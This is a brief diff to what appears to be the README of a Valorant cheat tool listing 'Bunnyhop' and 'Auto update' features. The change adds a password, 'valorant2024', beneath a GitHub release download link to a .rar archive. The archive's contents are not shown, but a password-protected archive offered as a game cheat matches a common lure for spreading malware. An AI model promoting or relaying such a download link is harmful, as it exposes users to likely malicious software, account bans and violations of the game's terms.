@@ -16,5 +16,6 @@ Misc
 -Bunnyhop -Auto update
 
 
-[Download](https://github.com/smsharifulalam/VALORANTSOFTWARE/releases/download/Download/valobypnatxes.rar)
+[Download](https://github.com/smsharifulalam/VALORANTSOFTWARE/releases/download/Download/valobypnatxes.rar) 
+Password - valorant2024
 
